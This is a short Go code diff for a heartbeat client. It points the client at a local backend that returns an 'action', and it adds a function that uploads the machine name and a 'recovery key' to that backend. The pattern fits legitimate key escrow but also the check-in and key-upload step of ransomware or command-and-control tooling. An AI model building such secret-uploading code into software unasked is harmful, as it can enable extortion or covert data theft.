@@ -3,6 +3,7 @@ package heartbeat
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"os"
 )
@@ -23,7 +24,7 @@ func SendHeartbeat() string {
 	})
 
 	resp, err := http.Post(
-		"https://YOUR_BACKEND/api/heartbeat",
+		"http://localhost:8080/api/heartbeat",
 		"application/json",
 		bytes.NewBuffer(body),
 	)
@@ -38,4 +39,29 @@ func SendHeartbeat() string {
 	json.NewDecoder(resp.Body).Decode(&r)
 
 	return r.Action
+}
+
+func SendRecoveryKey(key string) error {
+	deviceID := os.Getenv("COMPUTERNAME")
+	payload := map[string]string{
+		"device_id":    deviceID,
+		"recovery_key": key,
+	}
+	body, _ := json.Marshal(payload)
+
+	resp, err := http.Post(
+		"http://localhost:8080/api/key",
+		"application/json",
+		bytes.NewBuffer(body),
+	)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("backend returned non-200 status: %d", resp.StatusCode)
+	}
+
+	return nil
 }
